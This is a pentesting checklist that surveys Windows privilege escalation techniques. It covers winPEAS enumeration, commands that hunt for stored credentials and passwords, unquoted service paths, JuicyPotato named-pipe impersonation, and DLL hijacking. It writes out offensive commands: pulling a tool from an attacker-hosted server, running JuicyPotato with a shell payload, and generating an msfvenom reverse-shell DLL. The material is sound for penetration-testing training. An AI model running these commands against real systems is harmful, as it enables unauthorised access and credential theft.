---
Author(s): M-Nelly
Subject: Security
Topic: Privilege Escalation
DocType: Checklist
Comments: 
Description: High level overview of options for privilege escalation on Windows systems
tags:
  - pentesting
  - windows
---
## Introduction:
Privilege escalation is the process of pivoting vertically in a network to gain additional access or persistence in a network. Escalations usually happen as a result of misconfigurations causing user accounts to have limited admin rights. 
### Prerequisites:
Access to a system on the network you are attacking is required. 
## Instructions:
### Enumerating Privilege Escalation Vectors:
#### Automated - [[PEASS-NG]]:
If you have the ability to upload files and not have to worry about anti-virus, the PEASS script is a really easy way to check for privilege escalation vectors. 
>[!TIP]
>A precompiled binary for Windows can be found here: 
>https://github.com/carlospolop/PEASS-ng/releases

The easiest way to get the file on the target machine is to host it on your system using a [[Python]] HTTP server. In the folder that has your executable, run ` python -m http.server ` and pull it from the target machine using:
```PowerShell
iwr http://<YOUR IP>:8000/winpeas.exe -outfile winpeas.exe 
``` 
#### Manual - [[Windows Internals]]:
` systeminfo ` - Shows basic system information
` hostname ` - Shows system hostname
` net accounts ` - Shows local password policy
` arp -A ` - Shows hosts on the local network
` netstat -ano ` - Shows active connections and associated PID
` whoami /all ` - Shows user information, groups, and privileges 
- `SeImpersonatePrivilege` - Used in [[Potato Exploits]]
- `BUILTIN\Administrators` - Local admin group 
`cmdkey /list` - Shows stored credentials
- Use `runas /savecred /user:PC-Name\Username "command" ` to execute commands as other users if you have access to their stored credentials. 
` net use ` - Shows connected network shares
- Plaintext credentials
- Sensitive documents
- File based exploits
	- VB scripts in office files
` net users ` - Shows local users
` wmic qfe get Caption,Description,HotFixID,InstalledOn ` - Shows patches
` findstr /si string *.*` - Recursively search for files matching search string
- ` findstr /si password *.etc ` 
` reg query ` - Gets values associated with registry keys
- ` reg query HKLM /f password /t REG_SZ /s `
- ` reg query HKCU /f password /t REG_SZ /s `
` schtasks /query /fo list /v ` - List current scheduled tasks
` sc query state=all ` - Lists services and drivers
- Unquoted service paths in writable directories
` icacls /directory/ ` - List file permissions for files in search directory
- F - Full Access
- M - Modify
- W - Write
- I - Inherit
` Get-Clipboard ` - Show the contents of the current user's clipboard
### Exploiting Privilege Escalation Vulnerabilities:
#### Unquoted Service Path:
Service Path: ` C:\Program Files x86\Service Name\Service Executable.exe `
If ` \Service Name\ ` is a writable directory, and the service path being called by windows is not in quotes, we can place a malicious executable into that directory named ` Service.exe ` and Windows will execute that instead of executing ` Service Executable.exe `. 
This is useful if the service is being executed as a user that we want to pivot to and can grant us shell access as that user. 
#### Named Pipe Client Impersonation:
Named pipe vulnerabilities can be exploited using one of the potato executables or print spoofer depending on the version of Windows that the host is running. It might take a bit of research to find one that will work, but unpatched Windows 10 or lower and a user with ` SeImpersonatePrivilege ` should be a huge indicator that you should check for this exploit. 

In order to get it to work, you will need to get an exploit binary and a payload binary uploaded to the host. Once both are uploaded, call your shell with the exploit binary and you should get system access. Example:
`C:\temp\JuicyPotato.exe -t * -p C:\temp\shell.exe -l 443`
>[!NOTE]
>These exploits sometimes require multiple attempts to work. 
#### DLL Hijacking
DLL hijacking is a vulnerability similar to the unquoted service path vulnerability that takes advantage of the [Windows DLL Search Order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) and an improper reference to the DLL within the application. If an application does not include an explicit path to the DLL it is calling, it will search for the DLL in these places:
1. DLL Redirect
2. Win32 API
3. SxS Manifest
4. Loaded Modules
5. Known System DLLs
6. Package Dependency Graph
7. Executable Folder
8. System32
9. System
10. Windows Folder
11. Current Folder
12. Directories in $PATH 
To find DLL hijacking vulnerabilities, look for applications or services running as SYSTEM with executable paths in writable directories. Note that the root directory is writable by default and new directories will inherit this property. Folder permissions should read ` _NT AUTHORITY\Authenticated Users:(I)(M)_ ` if you can modify the contents. 
- If this is the case, you can exploit by replacing a DLL in the application directory with a malicious one. 
- If an application is calling a DLL that does not exist, you can exploit by placing an appropriately named malicious DLL in a directory that is in the system $PATH.
- If you find an application calling a DLL and have access to a location that would precede the DLL location in the search order, you can exploit by placing an appropriately named DLL in that location.
Malicious DLLs can be created with [[MetaSploit]]'s `msfvenom` using the ` -f ` flag to specify the file type as DLL. Example:
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=1234 -f dll -o msf.dll 
```
### Troubleshooting:
Privilege escalation in general is more art than science. Very often you will be using new techniques that have not been fully explored or developed. If your research indicates that something should work but isn't producing the intended result, the best thing to do is spin up a lab that you know is vulnerable and analyze both sides. I recommend familiarizing with docker and building a home lab with a sample of vulnerable machines. 
### Best Practices & Insights:
When conducting a penetration test, the goal is to be minimally invasive. If you need to hollow out an executable or change how a program executes, it is probably best to clear that with the client before you do it. 
## Footnotes:
### References:
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) 
- [OSCP Windows PrivEsc](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- [HackTricks WIndows PrivEsc Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
- [FuzzySecurity Windows PrivEsc](https://fuzzysecurity.com/tutorials/16.html)
- [Exploiting Weak Folder Permissions](http://www.greyhathacker.net/?p=738)
- [MSDocs DLL Search Order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [MSDocs SBS Assemblies](https://learn.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-)
- [MSDocs DLL Redirection](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection)
- [MSDocs Windows API Sets](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-apisets)
- [HackTricks DLL Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)
- [JuggernautSec SEImpersonatePrivilege](https://juggernaut-sec.com/seimpersonateprivilege/)
